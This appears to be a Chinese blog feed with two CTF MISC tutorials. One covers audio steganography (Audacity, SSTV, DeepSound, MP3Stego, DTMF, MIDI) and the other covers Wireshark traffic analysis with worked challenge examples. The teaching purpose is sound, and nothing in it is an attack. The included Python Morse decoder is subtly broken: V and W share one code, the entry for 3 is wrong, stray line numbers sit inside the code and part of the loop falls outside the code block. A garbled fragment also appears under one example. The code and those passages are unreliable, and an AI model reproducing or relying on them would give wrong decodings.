        <content type="html"><![CDATA[<h1 id="CTF——MISC——音频隐写"><a href="#CTF——MISC——音频隐写" class="headerlink" title="CTF——MISC——音频隐写"></a>CTF——MISC——音频隐写</h1><h2 id="一、常见工具"><a href="#一、常见工具" class="headerlink" title="一、常见工具"></a><strong>一、</strong>常见工具</h2><p>​     工具：Audacity、Adobe Audition(简称au)、SilentEye、DeepSound、SSTV、mp3stego。</p><p>​    其实和图片一样，数字音频也可以用于信息隐写，音视频隐写会存在比较明显的特征：</p><p>   · 音频载体信号存在冗余，为隐蔽信息提供支持；</p><p>   · 人类听觉系统频谱范围是20Hz18kHz，但对2kHz4kH信息最为敏感；</p><p>   · 人类听觉系统只对相对相位敏感，而无法感知绝对相位。</p><p>​    这里参考一位师傅写的文章</p><blockquote><p>  C语言解析WAV音频文件</p><p><a href="https://www.cnblogs.com/guojun-junguo/p/10129548.html">https://www.cnblogs.com/guojun-junguo/p/10129548.html</a></p></blockquote><p>   解释了WAVE文件的结构</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99.assets/640.png" alt="图片"></p><p>​     所以对于音频题，拿到题目当然首先是听一下，然后再根据是否获得信息来进行下一步操作</p><h2 id="二、常见题型"><a href="#二、常见题型" class="headerlink" title="二、常见题型"></a><strong>二、</strong>常见题型</h2><p>​      Wave (wav)， 文件头：57415645</p><h3 id="Audacity"><a href="#Audacity" class="headerlink" title="Audacity"></a>Audacity</h3><p>​     作为最常用的音频查看软件，当试听题目音频没有明显杂音或者信息时，一般会选择用Audacity打开</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99.assets/640-16805951928991.png" alt="图片"></p><p>  并可以选择查看波形、频谱图</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99.assets/640-16805951928992.png" alt="图片"></p><p>​    可能会获得morse电码或者二进制的信息,当然部分题目信息量过大，会用到脚本来进行提取</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99.assets/640-16805951928993.png" alt="图片"></p><p>​    此外，波形图的上下峰也可能会暗含信息</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99.assets/640-168059526983224.png" alt="图片"></p><p>​    出题方式是千变万化，分离左右声道来获得信息，diff反相音频获得信息，通过倒序，反相，慢速，降噪等步骤也视情况尝试（例如：经典的单词模糊听写，需要倒序后慢速听；充斥杂音的音频需要一定程度的降噪才能获得信息；ASCII编码的数字需要注意是否越过127）</p><h3 id="SSTV"><a href="#SSTV" class="headerlink" title="SSTV"></a>SSTV</h3><p>（慢扫描电视）</p><p>​    把图片隐藏到音频信息中的隐写，手机上可以装Robot36（app），PC可以用MMSSTV。![图片](data:image&#x2F;svg+xml,%3C%3Fxml version&#x3D;’1.0’ encoding&#x3D;’UTF-8’%3F%3E%3Csvg width&#x3D;’1px’ height&#x3D;’1px’ viewBox&#x3D;’0 0 1 1’ version&#x3D;’1.1’ xmlns&#x3D;’<a href="http://www.w3.org/2000/svg">http://www.w3.org/2000/svg</a>‘ xmlns:xlink&#x3D;’<a href="http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke&#x3D;’none’ stroke-width&#x3D;’1’ fill&#x3D;’none’ fill-rule&#x3D;’evenodd’ fill-opacity&#x3D;’0’%3E%3Cg transform&#x3D;’translate(-249.000000, -126.000000)’ fill&#x3D;’%23FFFFFF’%3E%3Crect x&#x3D;’249’ y&#x3D;’126’ width&#x3D;’1’ height&#x3D;’1’%3E%3C&#x2F;rect%3E%3C&#x2F;g%3E%3C&#x2F;g%3E%3C&#x2F;svg%3E)</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99.assets/640-16805951928994.png" alt="图片"></p><h3 id="Deepsound"><a href="#Deepsound" class="headerlink" title="Deepsound"></a>Deepsound</h3><p>​    作为带有密码的音频隐写</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99.assets/640-16805951929005.png" alt="图片"></p><p>​    Deepsound的密码可通过john爆破</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99.assets/640-16805951929006.png" alt="图片"></p><h3 id="MP3stego"><a href="#MP3stego" class="headerlink" title="MP3stego"></a>MP3stego</h3><p>​      MP3格式文件：</p><p>  cmd打开，将 Decode.exe 拖到命令行里，将要解密的文件放在文件夹中</p><p>  # 隐藏信息</p><p>  # —E 读取隐藏信息文件的内容，-P 设置密码</p><blockquote><p>encode.exe -E hidden.txt -P pass CTF.wav svega_stego.mp3</p></blockquote><p>  # 解密信息</p><blockquote><p>decode.exe -X svega_stego.mp3 -P pass</p></blockquote><h3 id="拨号隐写（DTMF）"><a href="#拨号隐写（DTMF）" class="headerlink" title="拨号隐写（DTMF）"></a>拨号隐写（DTMF）</h3><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99.assets/640-16805951929007.png" alt="图片"></p><p> 推荐一个GitHub上的脚本工具</p><blockquote><p><a href="https://gitcode.net/mirrors/ribt/dtmf-decoder?utm_source=csdn_github_accelerator">https://gitcode.net/mirrors/ribt/dtmf-decoder?utm_source=csdn_github_accelerator</a></p></blockquote><h3 id="MIDI隐写"><a href="#MIDI隐写" class="headerlink" title="MIDI隐写"></a>MIDI隐写</h3><p>MIDI (mid)， 文件头：4D546864</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99.assets/640-168059533112226.png" alt="图片"></p><p>​    乍看没有发现任何信息，但稍微研究一下midi的文件结构，将音乐通道由2改为3</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99.assets/640-16805951929008.png" alt="图片"></p><p>​    再重新打开文件，即可发现隐藏通道下的二维码</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99.assets/640-16805951929009.png" alt="图片"></p><h3 id="信号分析"><a href="#信号分析" class="headerlink" title="信号分析"></a>信号分析</h3><p>​        包括无线电信号分析，GPS信号分析，一般用Adobe Audition或者Audacity分析；PT2242信号：前面4bit表示同步码，中间的20bit表示地址码，后面的4bit表示功能码，最后一位是停止码。</p><h3 id="HackRF区别"><a href="#HackRF区别" class="headerlink" title="HackRF区别"></a>HackRF区别</h3><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99.assets/640-168059519290010.png" alt="图片"></p><p>原始数据</p><p>​    当见到音频的后缀为一些奇怪的组合时，比如扩展名为s8，要考虑是否为原始数据，所以在导入时选择导入原始数据![图片](data:image&#x2F;svg+xml,%3C%3Fxml version&#x3D;’1.0’ encoding&#x3D;’UTF-8’%3F%3E%3Csvg width&#x3D;’1px’ height&#x3D;’1px’ viewBox&#x3D;’0 0 1 1’ version&#x3D;’1.1’ xmlns&#x3D;’<a href="http://www.w3.org/2000/svg">http://www.w3.org/2000/svg</a>‘ xmlns:xlink&#x3D;’<a href="http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke&#x3D;’none’ stroke-width&#x3D;’1’ fill&#x3D;’none’ fill-rule&#x3D;’evenodd’ fill-opacity&#x3D;’0’%3E%3Cg transform&#x3D;’translate(-249.000000, -126.000000)’ fill&#x3D;’%23FFFFFF’%3E%3Crect x&#x3D;’249’ y&#x3D;’126’ width&#x3D;’1’ height&#x3D;’1’%3E%3C&#x2F;rect%3E%3C&#x2F;g%3E%3C&#x2F;g%3E%3C&#x2F;svg%3E)</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99.assets/640-168059519290011.png" alt="图片"></p><p>​    默认采样率、尾端和编码获取不到信息时，也要根据需要调试（频谱图可以容易的识别出信号的中心频率）</p><h2 id="三、例题"><a href="#三、例题" class="headerlink" title="三、例题"></a>三、例题</h2><h3 id="1，你真的很不错"><a href="#1，你真的很不错" class="headerlink" title="1，你真的很不错"></a>1，你真的很不错</h3><p>（flag.wav; <a href="https://so.csdn.net/so/search?q=%E9%9F%B3%E9%A2%91&spm=1001.2101.3001.7020">音频</a>波形转摩斯密码）</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70.png" alt="img"></p><pre><code class="erlang">.... -... -.-. ----. ..--- ..... -.... ....- ----. -.-. -... ----- .---- ---.. ---.. --.- ..... ..--- . -.... .---- --... -.. --... ----- ----. ..--- ----. .---- ----. .---- -.-.</code></pre><h4 id="Python摩斯电码解密"><a href="#Python摩斯电码解密" class="headerlink" title="Python摩斯电码解密"></a>Python摩斯电码解密</h4><p>摩斯电码解密可以使用诸多在线网站，当然也可以用Python进行解密：</p><p>Python</p><pre><code class="python"># -*- coding:utf-8 -*-s = input(&quot;input the cipher_text Enclose with quotes:&quot;)codebook = &#123;    &#39;A&#39;:&quot;.-&quot;,    &#39;B&#39;:&quot;-...&quot;,    &#39;C&#39;:&quot;-.-.&quot;,    &#39;D&#39;:&quot;-..&quot;,    &#39;E&#39;:&quot;.&quot;,    &#39;F&#39;:&quot;..-.&quot;,    &#39;G&#39;:&quot;--.&quot;,    &#39;H&#39;:&quot;....&quot;,    &#39;I&#39;:&quot;..&quot;,    &#39;J&#39;:&quot;.---&quot;,    &#39;K&#39;:&quot;-.-&quot;,    &#39;L&#39;:&quot;.-..&quot;,    &#39;M&#39;:&quot;--&quot;,    &#39;N&#39;:&quot;-.&quot;,    &#39;O&#39;:&quot;---&quot;,    &#39;P&#39;:&quot;.--.&quot;,    &#39;Q&#39;:&quot;--.-&quot;,    &#39;R&#39;:&quot;.-.&quot;,    &#39;S&#39;:&quot;...&quot;,    &#39;T&#39;:&quot;-&quot;,    &#39;U&#39;:&quot;..-&quot;,    &#39;V&#39;:&quot;.--&quot;,    &#39;W&#39;:&quot;.--&quot;,    &#39;X&#39;:&quot;-..-&quot;,    &#39;Y&#39;:&quot;-.--&quot;,    &#39;Z&#39;:&quot;--..&quot;,    &#39;1&#39;:&quot;.----&quot;,    &#39;2&#39;:&quot;..---&quot;,    &#39;3&#39;:&quot;...---&quot;,    &#39;4&#39;:&quot;....-&quot;,    &#39;5&#39;:&quot;.....&quot;,    &#39;6&#39;:&quot;-....&quot;,    &#39;7&#39;:&quot;--...&quot;,    &#39;8&#39;:&quot;---..&quot;,    &#39;9&#39;:&quot;----.&quot;,    &#39;0&#39;:&quot;-----&quot;,    &#39;.&#39;:&quot;.━.━.━&quot;,    &#39;?&#39;:&quot;..--..&quot;,    &#39;!&#39;:&quot;-.-.--&quot;,    &#39;(&#39;:&quot;-.--.&quot;,    &#39;@&#39;:&quot;.--.-.&quot;,    &#39;:&#39;:&quot;---...&quot;,    &#39;=&#39;:&quot;-...-&quot;,    &#39;-&#39;:&quot;-....-&quot;,    &#39;)&#39;:&quot;-.--.-&quot;,    &#39;+&#39;:&quot;.-.-.&quot;,    &#39;,&#39;:&quot;--..--&quot;,    &#39;\&#39;&#39;:&quot;.----.&quot;,    &#39;_&#39;:&quot;..--.-&quot;,    &#39;$&#39;:&quot;...-..-&quot;,    &#39;;&#39;:&quot;-.-.-.&quot;,    &#39;/&#39;:&quot;-..-.&quot;,    &#39;\&quot;&#39;:&quot;.-..-.&quot;,&#125;clear = &quot;&quot;cipher = &quot;&quot;12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758591234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859</code></pre><p>while 1:<br>ss &#x3D; s.split(“ “);<br>for c in ss:<br>for k in codebook.keys():<br>if codebook[k] &#x3D;&#x3D; c:<br>cipher+&#x3D;k<br>print(cipher)<br>break;</p><h3 id="1-2，lookme（flag-wav-高低波形转换）"><a href="#1-2，lookme（flag-wav-高低波形转换）" class="headerlink" title="1.2，lookme（flag.wav; 高低波形转换）"></a>1.2，lookme（flag.wav; 高低波形转换）</h3><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-16683532517032.png" alt="img"></p><pre><code class="undefined">110011011011001100001110011111110111010111011000010101110101010110011011101011101110110111011110011111101</code></pre><h3 id="2，我爱我的祖国（flag-mp4-NTFS交换数据流，以音频为主数据流）"><a href="#2，我爱我的祖国（flag-mp4-NTFS交换数据流，以音频为主数据流）" class="headerlink" title="2，我爱我的祖国（flag.mp4 ; NTFS交换数据流，以音频为主数据流）"></a>2，我爱我的祖国（flag.mp4 ; NTFS交换数据流，以音频为主数据流）</h3><p>把文件直接在 NtfsStreamsEditor 中打开搜索，就能看到一些非主数据流文件</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99.assets/20191113152551245.png" alt="img"></p><p>得到一张图片，打开图片得到flag</p><h3 id="3，用眼睛去倾听（flag-wav-音频频谱隐藏）"><a href="#3，用眼睛去倾听（flag-wav-音频频谱隐藏）" class="headerlink" title="3，用眼睛去倾听（flag.wav; 音频频谱隐藏）"></a>3，用眼睛去倾听（flag.wav; 音频<a href="https://so.csdn.net/so/search?q=%E9%A2%91%E8%B0%B1&spm=1001.2101.3001.7020">频谱</a>隐藏）</h3><p>在Audacity中打开，调到查看音频频谱：</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-16683532622435.png" alt="img"></p><h3 id="4，音乐永不停止（flag-mp3-MP3音频文件隐写）"><a href="#4，音乐永不停止（flag-mp3-MP3音频文件隐写）" class="headerlink" title="4，音乐永不停止（flag.mp3; MP3音频文件隐写）"></a>4，音乐永不停止（flag.mp3; MP3音频文件隐写）</h3><p>需要用到 Mp3Stego 中解密隐藏的信息</p><p>指令：</p><pre><code class="css">Decode.exe -P pass -X flag.wavFlag is SkYzWEk0M1JOWlNHWTJTRktKUkdJTVpXRzVSV0U2REdHTVpHT1pZPQ== ???</code></pre><h3 id="5，Silenteye（flag-wav-音频中的LSB（最低有效位）隐写）"><a href="#5，Silenteye（flag-wav-音频中的LSB（最低有效位）隐写）" class="headerlink" title="5，Silenteye（flag.wav ;  音频中的LSB（最低有效位）隐写）"></a>5，Silenteye（flag.wav ;  音频中的LSB（最低有效位）隐写）</h3><p>类似于图片隐写中的 LSB 隐写，音频中也有对应的 LSB 隐写。主要可以使用 <a href="http://silenteye.v1kings.io/">Silenteye</a> 工具</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-16683532669687.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>MISC—流量分析</title>
      <link href="/2023/03/07/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
      <url>/2023/03/07/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF——MISC——流量分析"><a href="#CTF——MISC——流量分析" class="headerlink" title="CTF——MISC——流量分析"></a>CTF——MISC——流量分析</h1><p><strong>概括来讲在比赛中的流量分析有以下三个方向：</strong><br>1、流量包修复<br>2、协议分析<br>3、数据提取</p><h2 id="一、流量包修复"><a href="#一、流量包修复" class="headerlink" title="一、流量包修复"></a>一、流量包修复</h2><p>比如一个流量包它的文件头也是对的，里边也没有包含其他的文件等等等等，但是就是打开出现一些未知的错误，这时候就要考虑对流量包进行修复。</p><p>这类题目考察较少，通常都借助现成的工具例如PCAPFIX直接修复。</p><p><a href="https://github.com/Rup0rt/pcapfix/tree/devel">PcapFix</a></p><h2 id="二、协议分析"><a href="#二、协议分析" class="headerlink" title="二、协议分析"></a>二、协议分析</h2><p>此类方向需要对分析流量包工具所用的语法有一定的掌握，这里以wireshark为例，须掌握wireshark过滤器（捕捉过滤器与显示过滤器）的基础语法，从而更快更精准的获取指定的信息。</p><p>捕捉过滤器：用于决定将什么样的信息记录在捕捉结果中，需要在开始捕捉前设置。<br>显示过滤器：用于在捕获结果中进行详细查找，可以在得到捕捉结果后进行更改</p><p><em><strong>*捕捉过滤器基础语法*</strong></em><br><em><strong>*Protocol Direction Host(s) Value LogicalOperations other expression*</strong></em><br><em><strong>*tcp dst 10.1.1.1 80 and tcp dst 10.2.2.2 3128*</strong></em></p><p><strong>Protocol</strong><br>可能的值: ether, fddi, ip, arp, rarp, decnet,lat, sca, moprc, mopdl, tcp and udp，如果没有特别指明是什么协议，则默认使用所有支持的协议。<br><strong>Direction</strong><br>可能的值: src, dst, src and dst, src or dst，如果没有特别指明来源或目的地，则默认使用 “src or dst” 作为关键字。<br><strong>Host(s)</strong><br>可能的值： net, port,host, portrange，如果没有指定此值，则默认使用”host”关键字。<br>例如，”src 10.1.1.1”与”src host 10.1.1.1”相同。<br><strong>Logical Operations</strong><br>可能的值：not, and, or<br>否(“not”)具有最高的优先级，或(“or”)和与(“and”)具有相同的优先级<br>“not tcp port 3128 and tcp port23”与”(not tcp port 3128) and tcp port23”相同。</p><p><strong>举例分析：</strong><br>tcp dst port 3128 &#x2F;&#x2F;目的TCP端口为3128的封包。<br>ip src host 10.1.1.1 &#x2F;&#x2F;来源IP地址为10.1.1.1的封包。<br>host 10.1.2.3 &#x2F;&#x2F;目的或来源IP地址为10.1.2.3的封包。<br>src portrange 2000-2500<br>&#x2F;&#x2F;来源为UDP或TCP，并且端口号在2000至2500范围内的封包<br>not icmp &#x2F;&#x2F;除了icmp以外的所有封包。</p><p><em><strong>*显示过滤器基础语法*</strong></em><br><em><strong>*Protocol String1 String2 ComparisonOperator Value Logical Operations other expression*</strong></em><br><strong>Protocol</strong><br>可以使用大量位于OSI模型第2至7层的协议。在Expression中可以看到，例如，IP，TCP，DNS，SSH<br><strong>String1，String2</strong><br>可选择显示过滤器右侧表达式，点击父类的+号，然后查看其子类<br><strong>Comparison Oerators</strong><br>可以使用六种比较运算符</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166835570258139.png" alt="img"></p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166835570023637.png" alt="img"></p><p><strong>举例分析：</strong><br>snmp || dns || icmp &#x2F;&#x2F;显示SNMP或DNS或ICMP封包<br>ip.addr &#x3D;&#x3D; 10.1.1.1 &#x2F;&#x2F;显示源或目的IP为10.1.1.1的封包<br>ip.src !&#x3D; 10.1.2.3 and ip.dst!&#x3D;10.4.5.6 &#x2F;&#x2F;显示源不为10.1.2.3并且目的不为10.4.5.6的封包<br>tcp.port &#x3D;&#x3D; 25 &#x2F;&#x2F;显示来源或目的TCP端口号为25的封包<br>tcp.dport &#x3D;&#x3D; 25 &#x2F;&#x2F;显示目的TCP端口号为25的封包</p><p>如果过滤器语法是正确的，表达式背景为绿色，否则为红色</p><h2 id="三、数据提取"><a href="#三、数据提取" class="headerlink" title="三、数据提取"></a>三、数据提取</h2><p>这一块是流量包中另一个重点，通过对协议分析，找到题目的关键点，从而对所需要的数据进行提取。</p><p>Wireshark支持提取通过http传输（上传&#x2F;下载）的文件内容，方法如下：<br><strong>自动提取通过http传输的文件内容</strong><br>文件-&gt;导出对象-&gt;HTTP</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166835569232935.png" alt="img"></p><p>在打开的对象列表中找到有价值的文件，如压缩文件、文本文件、音频文件、图片等，点击<code>Save</code>进行保存，或者<code>Save All</code>保存所有对象再进入文件夹进行分析。</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166835568917133.png" alt="img"></p><p><strong>手动提取通过http传输的文件内容</strong><br>选中http文件传输流量包，在分组详情中找到<code>data</code>,<code>Line-based text</code>, <code>JPEG File Interchange Format</code>, <code>data:text/html</code>层，鼠标右键点击 – 选中 导出分组字节流。</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166835568565631.png" alt="img"></p><p>如果是菜刀下载文件的流量，需要删除分组字节流前开头和结尾的X@Y字符，否则下载的文件会出错。鼠标右键点击 – 选中 显示分组字节 </p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166835568209229.png" alt="img"></p><p>在弹出的窗口中设置开始和结束的字节（原字节数开头加3，结尾减3）</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166835567873427.png" alt="img"></p><p>最后点击<code>Save as</code>按钮导出。</p><h2 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h2><h3 id="1，题目：Cephalopod-图片提取"><a href="#1，题目：Cephalopod-图片提取" class="headerlink" title="1，题目：Cephalopod(图片提取)"></a>1，题目：Cephalopod(图片提取)</h3><p>题目来源：XCTF 3rd-HITB CTF-2017<br>考点：图片提取<br>题目信息：(Cephalopod.pcapng)</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166835567470825.png" alt="img"></p><p>c中zxz中z</p><h3 id="2-题目：特殊后门-icmp协议信息传输"><a href="#2-题目：特殊后门-icmp协议信息传输" class="headerlink" title="2,题目：特殊后门(icmp协议信息传输)"></a>2,题目：特殊后门(icmp协议信息传输)</h3><p>题目来源：第七届山东省大学生网络安全技能大赛<br>考点：字符串搜索，icmp协议信息传输<br>题目信息：(backdoor++.pcapng)</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166835566988423.png" alt="img"></p><p>打卡数据包，先在字节流中 搜索 flag 字符串 ：搜索到了 一段连续的数据包 里面都有flag字符串 </p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166835566681221.png" alt="img"></p><p>发现下面每一个 包里 都有一个 字符：</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166835566404219.png" alt="img"></p><p>一个一个收集后得到：</p><p><strong>flag{Icmp_backdoor_can_transfer-some_infomation}</strong></p><p><strong>小知识点：</strong></p><p><strong>ICMP（Internet Control Message Protocol）Internet控制<a href="https://baike.baidu.com/item/%E6%8A%A5%E6%96%87/3164352">报文</a>协议，它是<a href="https://baike.baidu.com/item/TCP%2FIP%E5%8D%8F%E8%AE%AE%E7%B0%87">TCP&#x2F;IP协议簇</a>的一个子协议，用于在IP<a href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA/455151">主机</a>、<a href="https://baike.baidu.com/item/%E8%B7%AF%E7%94%B1">路由</a>器之间传递控制消息。控制消息是指<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E9%80%9A">网络通</a>不通、<a href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA/455151">主机</a>是否可达、<a href="https://baike.baidu.com/item/%E8%B7%AF%E7%94%B1/363497">路由</a>是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用，ICMP协议是一种面向无连接的协议，用于传输出错报告控制信息。它是一个非常重要的协议，它对于<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8">网络安全</a>具有极其重要的意义。</strong></p><h3 id="3-题目：手机热点-蓝牙传输协议obex-数据提取"><a href="#3-题目：手机热点-蓝牙传输协议obex-数据提取" class="headerlink" title="3,题目：手机热点(蓝牙传输协议obex,数据提取)"></a>3,题目：手机热点(蓝牙传输协议obex,数据提取)</h3><p><strong>题目来源：第七季极客大挑战<br>考点：蓝牙传输协议obex,数据提取<br>题目信息：(Blatand_1.pcapng)</strong></p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166835565887217.png" alt="img"></p><p>题中说用 没流浪 向电脑传了文件 那肯定是 用的蓝牙 蓝牙协议 为  obex协议</p><p>帅选出 obex 协议包 ：发现 有一个包 里有一个 rar压缩包：</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166835565508615.png" alt="img"></p><p>要分离出 这个 rar 包：</p><p>方法一：直接复制 数据块 然后复制到winhex中 转存为 rar </p><p>复制数据块 as Hex stream  &gt;  在winhex中粘贴 为 ASCII HEX &gt;  删除前面的 